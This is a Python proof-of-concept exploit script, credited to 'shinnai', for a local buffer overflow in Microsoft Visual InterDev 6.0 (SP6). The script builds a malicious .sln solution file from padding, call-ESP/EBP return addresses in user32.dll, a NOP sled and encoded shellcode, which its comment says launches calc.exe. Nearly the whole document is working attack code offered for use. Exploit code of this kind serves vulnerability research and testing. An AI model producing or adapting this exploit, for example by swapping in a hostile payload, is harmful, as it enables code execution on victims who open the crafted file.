#usage: exploit.py FileName

import sys

print "------------------------------------------------------------------------"
print ' Microsoft Visual InterDev 6.0 (SP6) ".sln" files Local Buffer Overflow'
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org\n"
print " I really have much fun exploiting this one :)"
print " We need to patch five exceptions before we can have EIP:\n"
print " #7C80A268   8801             MOV BYTE PTR DS:[ECX],AL"
print " #ECX 42424242      <--       to patch with jumper 0x7E3FBEFF"
print "------------------------------------------------------------------------"

buff      = "A" * 1764

jumper    = "\xFF\xBE\x3F\x7E" #call ESP from user32.dll

buff2     = "A" * 4

buff3     = "A" * 24

buff4     = "A" * 16

buff5     = "A" * 4

nop       = "\x90\x90\x90\x90"

shellcode = \
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"+\
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"+\
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"+\
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"+\
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"+\
"\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x47"+\
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x54\x4a\x41\x4b\x38"+\
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x48"+\
"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"+\
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"+\
"\x46\x4f\x4b\x43\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x58"+\
"\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x30\x4b\x44"+\
"\x4b\x48\x4f\x35\x4e\x41\x41\x30\x4b\x4e\x4b\x38\x4e\x51\x4b\x38"+\
"\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"+\
"\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"+\
"\x4e\x30\x4b\x38\x42\x34\x4e\x50\x4b\x58\x42\x47\x4e\x41\x4d\x4a"+\
"\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x48\x42\x4b"+\
"\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x55\x41\x33"+\
"\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37"+\
"\x42\x55\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x35\x4a\x36\x4a\x59"+\
"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x56"+\
"\x4e\x46\x43\x56\x50\x32\x45\x46\x4a\x37\x45\x36\x42\x50\x5a"

#execute calc.exe

buff6     = "A" * 8

get_EIP   = "\xFF\xB9\x3F\x7E" #call EBP from user32.dll

buff7     = "A" * 56

try:
    sln_file = \
        'Microsoft Visual Studio Solution File, Format Version 1.00\n'+\
        'Project("{00000000-0000-0000-0000-000000000000}") = "CAB2", "' + buff + jumper + buff2 + jumper + buff3 + jumper + buff4 + jumper + buff5 + nop + shellcode + nop + '", "' + jumper + buff6 + get_EIP + buff7 + '"\n'+\
	'EndProject\n'+\
        'Global\n'+\
        '	GlobalSection(LocalDeployment) = postSolution\n'+\
        '		StartupProject = {00000000-0000-0000-0000-000000000000}\n'+\
        '	EndGlobalSection\n'+\
        '	GlobalSection(BuildOrder) = postSolution\n'+\
        '		0 = {00000000-0000-0000-0000-000000000000}\n'+\
        '	EndGlobalSection\n'+\
        '	GlobalSection(DeploymentRoot) = postSolution\n'+\
        '	EndGlobalSection\n'+\
        'VersionCompanyName="xxx"\n'+\
        'EndGlobal'
    
    out_file = open(sys.argv[1] + ".sln",'w')
    out_file.write(sln_file)
    out_file.close()
    print "\nFILE CREATION COMPLETED!\n"
except:
    print " \n -------------------------------------"
    print "  Usage: exploit.py FileName"
    print " -------------------------------------"
    print "\nAN ERROR OCCURS DURING FILE CREATION!"

